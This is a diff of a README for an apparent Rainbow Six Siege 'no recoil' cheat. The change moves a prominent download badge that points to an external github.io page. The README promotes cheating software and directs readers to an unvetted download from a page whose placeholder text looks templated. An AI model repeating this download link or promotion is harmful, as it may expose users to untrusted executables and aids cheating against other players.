@@ -2,15 +2,14 @@
 **RainBow No Recoil By Rich** is a simple but powerful project designed to (insert what it does).  
 It was created to (Reduce Recoil On Siege).
 
-## 🔗 Download Now Official Website
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://jamesong377.github.io/jamesong37715.github.io/)
-
 Built with:
- 
 - 🧠 **Focus**: lightweight, modular, and easy to use
 - 🧰 **Use case**: testing, training,  etc.
 
----
+
+## 🔗 Download Now Official Website
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://jamesong377.github.io/jamesong37715.github.io/)
+
 
 ## 🚀 Features
 ✅ **No Recoil** — removes or reduces recoil for selected weapons  
